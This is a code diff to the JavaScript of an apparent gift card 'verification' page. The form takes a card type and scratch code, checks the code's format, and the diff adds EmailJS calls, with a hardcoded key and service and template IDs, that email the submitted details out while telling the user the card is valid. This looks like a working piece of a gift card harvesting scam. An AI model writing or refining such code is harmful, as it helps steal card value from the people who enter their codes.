@@ -109,7 +109,7 @@
 document.querySelectorAll('.carousel[data-carousel="cred"]').forEach(initCredCarousel);
 
 
-/// form
+// form
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.querySelector(".verify-form");
   const cardSelect = document.getElementById("card-type");
@@ -119,6 +119,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const modalClose = modal.querySelector(".modal-close");
 
   // EmailJS init
+  emailjs.init("lhvg3CREDwBk6RH_4"); // replace with your EmailJS public key
 
   const cardPatterns = {
     Amazon: { pattern: /^[A-Z0-9]{4}\.[A-Z0-9]{5}\.[A-Z0-9]{4}$/, format: "XXXX.XXXXX.XXXX" },
@@ -230,27 +231,15 @@ document.addEventListener("DOMContentLoaded", () => {
     // --------------------------
     // 🔥 SEND EMAIL
     // --------------------------
-fetch("/api/send-email", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify(templateParams)
-})
-.then(res => res.json())
-.then(data => {
-  if (data.success) {
-    showModal(`✅ ${card} gift card is valid and email sent!`);
-  } else {
-    showModal(`⚠️ Email sending failed: ${data.error}`);
-  }
-})
-.catch(err => showModal(`⚠️ Server error: ${err.message}`));
-
-
+    emailjs.send("service_0e5tu6h", "template_23zl6b7", templateParams)
+      .then(() => showModal(`✅ ${card} gift card is valid and email sent!`))
+      .catch(err => showModal(`⚠️ Verification valid but email failed: ${err.text}`));
 
     form.reset();
     codeInput.placeholder = "Enter scratch code";
   });
 });
+
 
 
       function initTestiCarousel(root) {
